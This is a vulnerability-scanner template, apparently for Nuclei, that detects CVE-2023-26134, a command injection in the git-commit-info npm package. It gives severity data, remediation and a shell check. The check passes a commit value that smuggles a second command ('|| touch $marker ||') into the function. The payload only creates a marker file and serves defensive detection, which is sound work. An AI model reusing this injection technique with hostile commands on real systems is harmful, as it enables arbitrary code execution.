id: CVE-2023-26134

info:
  name: git-commit-info - Command Injection
  author: goodboycoder
  severity: critical
  description: |
    git-commit-info package versions prior to 2.0.2 contain a command injection vulnerability in the gitCommitInfo() function. The commit parameter is not properly sanitized, allowing attackers to execute arbitrary commands if they control the commit hash value.
  impact: |
    An attacker who can control the commit hash parameter can execute arbitrary system commands, potentially leading to complete system compromise, data theft, or denial of service.
  remediation: |
    Update git-commit-info to version 2.0.2 or later. The patched version includes proper validation and sanitization of the commit parameter to prevent command injection attacks.
  reference:
    - https://security.snyk.io/vuln/SNYK-JS-GITCOMMITINFO-5740174
    - https://github.com/JPeer264/node-git-commit-info/issues/24
    - https://nvd.nist.gov/vuln/detail/CVE-2023-26134
    - https://github.com/advisories/GHSA-6j86-w56j-6gpm
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-26134
    cwe-id: CWE-78
    epss-score: 0.00537
    epss-percentile: 0.78421
    cpe: cpe:2.3:a:git-commit-info_project:git-commit-info:*:*:*:*:*:node.js:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: git-commit-info_project
    product: git-commit-info
  tags: cve,cve2023,code,nodejs,git-commit-info,rce,kev,injection,intrusive,vuln

self-contained: true
code:
  - engine:
      - sh
      - bash
    source: |
      npm list git-commit-info >/dev/null 2>&1 || exit 0
      test_dir=$(mktemp -d)
      marker="$test_dir/vuln_marker"
      git -C "$test_dir" init >/dev/null 2>&1
      git -C "$test_dir" config user.email "test@test.com" >/dev/null 2>&1
      git -C "$test_dir" config user.name "Test" >/dev/null 2>&1
      echo "test" > "$test_dir/test.txt"
      git -C "$test_dir" add . >/dev/null 2>&1
      git -C "$test_dir" commit -m "test" >/dev/null 2>&1
      node -e "try { const gitCommitInfo = require('git-commit-info'); gitCommitInfo({ cwd: '$test_dir', commit: '1337bad || touch $marker ||' }); } catch(e) {}" 2>/dev/null
      if [ -f "$marker" ]; then
        echo "vulnerable"
      fi
      rm -rf "$test_dir"

    matchers:
      - type: word
        words:
          - "vulnerable"
